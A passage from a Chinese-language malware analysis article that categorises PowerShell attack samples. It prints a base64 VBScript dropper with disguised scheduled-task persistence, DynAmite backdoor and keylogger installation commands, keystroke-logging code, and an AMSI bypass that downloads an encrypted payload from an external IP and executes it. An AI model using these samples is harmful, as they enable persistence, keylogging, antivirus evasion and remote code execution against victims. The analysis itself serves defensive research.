$action.Arguments&nbsp;=&nbsp;&quot;$TaskArg&quot;
$rootFolder.RegisterTaskDefinition(&quot;$TaskName&quot;,$TaskDefinition,6,&quot;System&quot;,$null,5)
SCHTASKS&nbsp;/run&nbsp;/TN&nbsp;$TaskName</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.21 VB Task（10个样本，占比0.24%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类PowerShell代码最初来自于某个内嵌PowerShell脚本的PE文件，通过运行VB脚本来创建计划任务。VB脚本一旦执行就会启动另一个PowerShell脚本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$path=&nbsp;&quot;$env:userprofile\appdata\local\microsoft\Windows&quot;
if(-not(Test-Path&nbsp;-Path($path)))
{mkdir&nbsp;$path}
$fileout=&quot;$path\L69742.vbs&quot;;
$encstrvbs=&quot;c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K&quot;;
$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
$strvbs&nbsp;=&nbsp;$strvbs.replace(&#39;#dpath#&#39;,$path);
set-content&nbsp;$fileout&nbsp;$strvbs;
$tmpfile=&quot;$env:TEMP\U1848931.TMP&quot;;
$pscode_b64&nbsp;&nbsp;=get-content&nbsp;$tmpfile&nbsp;|&nbsp;out-string;
$pscode_b64=$pscode_b64.trim();
$pscode&nbsp;=&nbsp;[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
$id&nbsp;=&nbsp;[string](get-random&nbsp;-min&nbsp;10000&nbsp;-max&nbsp;100000)
$pscode&nbsp;=&nbsp;$pscode.replace(&#39;#id#&#39;,$id);
set-content&nbsp;&quot;$path\mc.ps1&quot;&nbsp;$pscode
$taskstr=&quot;schtasks&nbsp;/create&nbsp;/F&nbsp;/sc&nbsp;minute&nbsp;/mo&nbsp;2&nbsp;/tn&nbsp;&quot;&quot;GoogleServiceUpdate&quot;&quot;&nbsp;/tr&nbsp;&quot;&quot;\&quot;&quot;$fileout&quot;&quot;\&quot;&quot;&nbsp;&nbsp;&nbsp;&quot;;
iex&nbsp;&#39;cmd&nbsp;/c&nbsp;$taskstr&#39;;
{{CODE}}
The&nbsp;base64&nbsp;decoded&nbsp;VBScript&nbsp;–
{{CODE}}
set&nbsp;wss&nbsp;=&nbsp;CreateObject(&quot;WScript.Shell&quot;)
str&nbsp;=&nbsp;&quot;power&quot;&nbsp;&amp;amp;&nbsp;&quot;sh&quot;&nbsp;&amp;amp;&nbsp;&quot;ell&quot;&nbsp;&amp;amp;&nbsp;&quot;.e&quot;&nbsp;&amp;amp;&nbsp;&quot;xe&nbsp;-NoP&nbsp;-sta&nbsp;-NonI&nbsp;-e&quot;&nbsp;&amp;amp;&nbsp;&quot;xe&quot;&nbsp;&amp;amp;&nbsp;&quot;c&nbsp;byp&quot;&nbsp;&amp;amp;&nbsp;&quot;as&quot;&nbsp;&amp;amp;&nbsp;&quot;s&nbsp;-fi&quot;&nbsp;&amp;amp;&nbsp;&quot;le&nbsp;&quot;
path&nbsp;=&nbsp;&quot;#dpath#&quot;
str&nbsp;=&nbsp;str&nbsp;+&nbsp;path&nbsp;+&nbsp;&quot;\mc.ps1&quot;
wss.Run&nbsp;str,&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">4.22 DynAmite Launcher （6个样本，占比0.15%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.23 DynAmite KL（1个样本，占比0.02%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">DynAmite是一个“恶意软件生成工具包”，可以根据用户定制功能，创建恶意软件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">DynAmite允许用户组合他们所需要的功能，生成一个PE封装文件，利用PowerShell命令执行所定制的任务。我所收集到的此类代码主要来自于公开工具，其中变量名和变量位置可以有多种不同表现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">“DynAmite Launcher”变种通过计划任务完成本地持久化目的。以下是此类变种的三种不同表现形式，这三种样本可能由DynAmite使用不同的版本和配置生成。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\Backdoor&quot;&nbsp;/XML&nbsp;C:\Windows\Temp\task.xml
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\Keylogger&quot;&nbsp;/XML&nbsp;C:\Windows\Temp\task2.xml
SCHTASKS&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\Backdoor&quot;
SCHTASKS&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\Keylogger&quot;
Remove-Item&nbsp;&quot;C:\Windows\Temp\*.xml&quot;
#create&nbsp;backdoor&nbsp;task
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\DynAmite&quot;&nbsp;/XML&nbsp;C:\Windows\Temp\dynatask.xml
#create&nbsp;upload&nbsp;task
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\Uploader&quot;&nbsp;/XML&nbsp;C:\Windows\Temp\upltask.xml
#run&nbsp;backdoor&nbsp;task
SCHTASKS&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\DynAmite\DynAmite&quot;
#create&nbsp;registry&nbsp;entries&nbsp;for&nbsp;keylogger&nbsp;and&nbsp;screenspy
New-ItemProperty&nbsp;-path&nbsp;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&nbsp;-Name&nbsp;Keylogger&nbsp;-PropertyType&nbsp;String&nbsp;-Value&nbsp;&quot;C:\Windows\dynakey.exe&quot;
New-ItemProperty&nbsp;-path&nbsp;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&nbsp;-Name&nbsp;ScreenSpy&nbsp;-PropertyType&nbsp;String&nbsp;-Value&nbsp;&quot;C:\Windows\dynascr.exe&quot;
#run&nbsp;keylogger&nbsp;and&nbsp;screenspy
C:\Windows\dynakey.exe
C:\Windows\dynascr.exe
#cleanup&nbsp;temp&nbsp;folder
Remove-Item&nbsp;&quot;C:\Windows\Temp\*&quot;
$loot&nbsp;=&nbsp;($env:LOCALAPPDATA&nbsp;+&nbsp;&quot;\dyna\&quot;);&nbsp;md&nbsp;$loot
certutil&nbsp;-decode&nbsp;res.crt&nbsp;($loot&nbsp;+&nbsp;&quot;res&quot;);&nbsp;certutil&nbsp;-decode&nbsp;kl.crt&nbsp;($loot&nbsp;+&nbsp;&quot;kl.exe&quot;);&nbsp;certutil&nbsp;-decode&nbsp;st.crt&nbsp;($loot&nbsp;+&nbsp;&quot;st.exe&quot;);&nbsp;&nbsp;certutil&nbsp;-decode&nbsp;cry.crt&nbsp;($loot&nbsp;+&nbsp;&quot;cry.exe&quot;);&nbsp;certutil&nbsp;-decode&nbsp;t1.crt&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t1.xml&quot;);&nbsp;certutil&nbsp;-decode&nbsp;t2.crt&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t2.xml&quot;);&nbsp;certutil&nbsp;-decode&nbsp;t3.crt&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t3.xml&quot;);&nbsp;certutil&nbsp;-decode&nbsp;t4.crt&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t4.xml&quot;);&nbsp;certutil&nbsp;-decode&nbsp;t5.crt&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t5.xml&quot;);&nbsp;certutil&nbsp;-decode&nbsp;bd.crt&nbsp;C:\ProgramData\bd.exe
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\1&quot;&nbsp;/XML&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t1.xml&quot;)
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\2&quot;&nbsp;/XML&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t2.xml&quot;)
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\3&quot;&nbsp;/XML&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t3.xml&quot;)
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\4&quot;&nbsp;/XML&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t4.xml&quot;)
schtasks.exe&nbsp;/create&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\5&quot;&nbsp;/XML&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\t5.xml&quot;)
schtasks.exe&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\1&quot;
schtasks.exe&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\2&quot;
schtasks.exe&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\3&quot;
schtasks.exe&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\4&quot;
schtasks.exe&nbsp;/run&nbsp;/TN&nbsp;&quot;Microsoft\Windows\Windows&nbsp;Printer&nbsp;Manager\5&quot;
Remove-Item&nbsp;($env:TEMP&nbsp;+&nbsp;&quot;\*.xml&quot;)&nbsp;-Recurse&nbsp;–Force</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">“DynAmite KL”变种是该套件的键盘记录器组件，但其直接来源于对老版本PowerSploit的Get-Keystrokes函数的改造升级。以下是对老版本Get-Keystrokes以及“DynAmite KL“代码的比较，从中我们可以看出后者对变量位置及类型进行了修改。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Get-Keystrokes代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$LeftShift&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$RightShift&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$LeftCtrl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$RightCtrl&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$LeftAlt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$RightAlt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$TabKey&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$SpaceBar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$DeleteKey&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$EnterKey&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$BackSpaceKey&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$LeftArrow&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$RightArrow&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$UpArrow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$DownArrow&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$LeftMouse&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
$RightMouse&nbsp;&nbsp;&nbsp;=&nbsp;($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton)&nbsp;-band&nbsp;0x8000)&nbsp;-eq&nbsp;0x8000
if&nbsp;($LeftShift&nbsp;-or&nbsp;$RightShift)&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Shift]&#39;}
if&nbsp;($LeftCtrl&nbsp;&nbsp;-or&nbsp;$RightCtrl)&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Ctrl]&#39;}
if&nbsp;($LeftAlt&nbsp;&nbsp;&nbsp;-or&nbsp;$RightAlt)&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Alt]&#39;}
if&nbsp;($TabKey)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Tab]&#39;}
if&nbsp;($SpaceBar)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[SpaceBar]&#39;}
if&nbsp;($DeleteKey)&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Delete]&#39;}
if&nbsp;($EnterKey)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Enter]&#39;}
if&nbsp;($BackSpaceKey)&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Backspace]&#39;}
if&nbsp;($LeftArrow)&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Left&nbsp;Arrow]&#39;}
if&nbsp;($RightArrow)&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Right&nbsp;Arrow]&#39;}
if&nbsp;($UpArrow)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Up&nbsp;Arrow]&#39;}
if&nbsp;($DownArrow)&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Down&nbsp;Arrow]&#39;}
if&nbsp;($LeftMouse)&nbsp;&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Left&nbsp;Mouse]&#39;}
if&nbsp;($RightMouse)&nbsp;&nbsp;&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Right&nbsp;Mouse]&#39;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">DynAKey函数代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$LeftShift&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(160)
$RightShift&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(161)
$LeftCtrl&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(162)
$RightCtrl&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(163)
$LeftAlt&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(164)
$RightAlt&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(165)
$TabKey&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(9)
$SpaceBar&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(32)
$DeleteKey&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(127)
$EnterKey&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(13)
$BackSpaceKey&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(8)
$LeftArrow&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(37)
$RightArrow&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(39)
$UpArrow&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(38)
$DownArrow&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(34)
$LeftMouse&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(1)
$RightMouse&nbsp;=&nbsp;$ImportDll::GetAsyncKeyState(2)
if&nbsp;((($LeftShift&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($RightShift&nbsp;-eq&nbsp;-32767))&nbsp;-or&nbsp;(($LeftShift&nbsp;-eq&nbsp;-32768)&nbsp;-or&nbsp;($RightShfit&nbsp;-eq&nbsp;-32768)))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Shift]&nbsp;&#39;}
if&nbsp;((($LeftCtrl&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($LeftCtrl&nbsp;-eq&nbsp;-32767))&nbsp;-or&nbsp;(($RightCtrl&nbsp;-eq&nbsp;-32768)&nbsp;-or&nbsp;($RightCtrl&nbsp;-eq&nbsp;-32768)))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Ctrl]&nbsp;&#39;}
if&nbsp;((($LeftAlt&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($LeftAlt&nbsp;-eq&nbsp;-32767))&nbsp;-or&nbsp;(($RightAlt&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($RightAlt&nbsp;-eq&nbsp;-32767)))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Alt]&nbsp;&#39;}
if&nbsp;(($TabKey&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($TabKey&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Tab]&nbsp;&#39;}
if&nbsp;(($SpaceBar&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($SpaceBar&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[SpaceBar]&nbsp;&#39;}
if&nbsp;(($DeleteKey&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($DeleteKey&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Delete]&nbsp;&#39;}
if&nbsp;(($EnterKey&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($EnterKey&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Enter]&nbsp;&#39;}
if&nbsp;(($BackSpaceKey&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($BackSpaceKey&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Backspace]&nbsp;&#39;}
if&nbsp;(($LeftArrow&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($LeftArrow&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Left&nbsp;Arrow]&nbsp;&#39;}
if&nbsp;(($RightArrow&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($RightArrow&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Right&nbsp;Arrow]&nbsp;&#39;}
if&nbsp;(($UpArrow&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($UpArrow&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Up&nbsp;Arrow]&nbsp;&#39;}
if&nbsp;(($DownArrow&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($DownArrow&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Down&nbsp;Arrow]&nbsp;&#39;}
if&nbsp;(($LeftMouse&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($LeftMouse&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Left&nbsp;Mouse]&nbsp;&#39;}
if&nbsp;(($RightMouse&nbsp;-eq&nbsp;-32767)&nbsp;-or&nbsp;($RightMouse&nbsp;-eq&nbsp;-32768))&nbsp;{$LogOutput&nbsp;+=&nbsp;&#39;[Right&nbsp;Mouse]&nbsp;&#39;}</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">（四）其他技术类别</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.24 AMSI Bypass（8个样本，占比0.20%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">反恶意软件扫描接口（Antimalware Scan Interface, AMSI）是微软在Windows10中新增的一项功能，旨在为应用程序和反病毒软件建立顺畅的通信渠道。理想情况下，应用程序（在本文中为PowerShell应用）在运行时会对从本地或远程获取到的脚本去混淆处理，通过AMSI接口传递给反病毒软件进行安全性扫描。如果反病毒软件判定脚本具有恶意性质，应用程序会阻止脚本的进一步运行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Matt Graeber发布了一行Twitter短文，告诉人们如何通过将“amsiInitFailed“设置为”True“来绕过AMSI机制，这种设置会让防病毒软件误以为AMSI失效从而绕过此项检查。</span></p><pre class="brush:plain;toolbar:false">[ReF].ASSEmbly.GetTYpe(&#39;System.Management.Automation.AmsiUtils&#39;)|?{$_}|%{$_.GeTFIElD(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT&nbsp;System.NET.WebClieNt;$u=&#39;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;6.1;&nbsp;WOW64;&nbsp;Trident/7.0;&nbsp;rv:11.0)&nbsp;like&nbsp;Gecko&#39;;$Wc.HEAdERs.ADD(&#39;User-Agent&#39;,$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs&nbsp;=&nbsp;[SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS(&#39;Dv,inKZ&amp;lt;@{3mjG4&amp;amp;1k:Vcl7o)EY*J?6x&#39;);$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD(&quot;Cookie&quot;,&quot;session=Pu8sEnIpxIwINbUOVsxlL66DoHA=&quot;);$ser=&#39;http://35.165.38[.]15:80&#39;;$t=&#39;/login/process.php&#39;;$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](&amp;amp;&nbsp;$R&nbsp;$data&nbsp;($IV+$K))|IEX</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以上代码与PowerShell Empire中的EncryptedScriptDropper存在类似异或处理特征，可能与之直接有关，或者参考了其中部分代码。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">4.25 PowerSploit GTS（3个样本，占比0.07%）</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">此类变种直接来源于PowerSploit的Get-TimedScreenshot模块。以下代码每隔两秒抓取一次屏幕截图。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;Get-TimedScreenshot
{
&nbsp;&nbsp;&nbsp;&nbsp;[CmdletBinding()]&nbsp;Param(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$True)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ValidateScript({Test-Path&nbsp;-Path&nbsp;$_&nbsp;})]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[String]&nbsp;$Path,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$True)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Int32]&nbsp;$Interval,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Parameter(Mandatory=$True)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[String]&nbsp;$EndTime
&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;Function&nbsp;Get-Screenshot&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ScreenBounds&nbsp;=&nbsp;[Windows.Forms.SystemInformation]::VirtualScreen
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ScreenshotObject&nbsp;=&nbsp;New-Object&nbsp;Drawing.Bitmap&nbsp;$ScreenBounds.Width,&nbsp;$ScreenBounds.Height
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$DrawingGraphics&nbsp;=&nbsp;[Drawing.Graphics]::FromImage($ScreenshotObject)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$DrawingGraphics.CopyFromScreen(&nbsp;$ScreenBounds.Location,&nbsp;[Drawing.Point]::Empty,&nbsp;$ScreenBounds.Size)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$DrawingGraphics.Dispose()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ScreenshotObject.Save($FilePath)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ScreenshotObject.Dispose()
&nbsp;&nbsp;&nbsp;&nbsp;}
